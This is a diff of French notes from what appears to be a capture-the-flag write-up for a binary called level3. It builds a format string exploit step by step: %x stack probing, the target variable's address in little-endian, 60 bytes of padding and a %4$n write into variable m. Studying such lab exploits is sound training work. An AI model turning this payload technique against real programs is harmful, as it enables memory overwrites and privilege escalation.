@@ -17,11 +17,12 @@ on va essayer de trouver ou se trouve l'adresse avec
 
 python -c 'print "CCCC %x %x %x %x %x %x"' > /tmp/test
 cat /tmp/test - | ./level3
+
 la ou ca se repete c'est la 4 eme position donc on va mettre l'adresse de la variable m qui est : \x8c\x98\x04\x08
 
 python -c 'print "\x8c\x98\x04\x08 %x %x %x %x"' > /tmp/exploit
 
-on veut changer le contenu de M qui accepte que 64 bytes donc l'adresse M = 4 il faut qu'on rajoute 60
+on veut changer le contenu de M qui accepte que 64 bytes donc l'adresse M fait 4bytes il faut qu'on rajoute 60
 
 python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/exploit
 
